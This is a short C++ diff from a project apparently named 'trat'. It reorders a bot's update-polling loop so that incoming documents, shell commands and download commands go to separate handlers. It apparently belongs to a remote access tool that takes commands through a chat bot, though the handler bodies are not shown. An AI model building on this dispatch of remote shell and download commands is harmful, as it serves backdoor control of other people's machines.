@@ -31,13 +31,19 @@ namespace trat
           auto message_text = message.text;
           auto message_document = message.document;
 
-          if (this->checkIfCommand(message_text)) 
+          if  ( (message_document) && !(message_text) )
           {
-            // Handle commands synchronously
+            auto future = std::async(std::launch::async, [this, message_document]()
+            {
+              this->handleDocuments(message_document);
+            });
+            future.get();
+          
+          }else if (this->checkIfCommand(message_text)) 
+          {
             this->handleShellCommand(message_text);
             this->handleDownloadCommand(message_text);
-          }
-          else 
+          }else 
           {
             // Handle non-command message asynchronously, and capture the returned future
             auto future = std::async(std::launch::async, [this]()
@@ -48,18 +54,7 @@ namespace trat
             future.get(); // This ensures we consume the result and prevent the warning.
           }
 
-          if (message_document)
-          {
-            // Handle document asynchronously, and capture the returned future
-            auto future = std::async(std::launch::async, [this, message_document]()
-            {
-              this->handleDocuments(message_document);
-            });
-            // Consume the future result to avoid the warning
-            future.get();
-          }
-
-          // Update the offset after processing
+                    // Update the offset after processing
           offset = update.update_id + 1;
 
           // To prevent busy-waiting
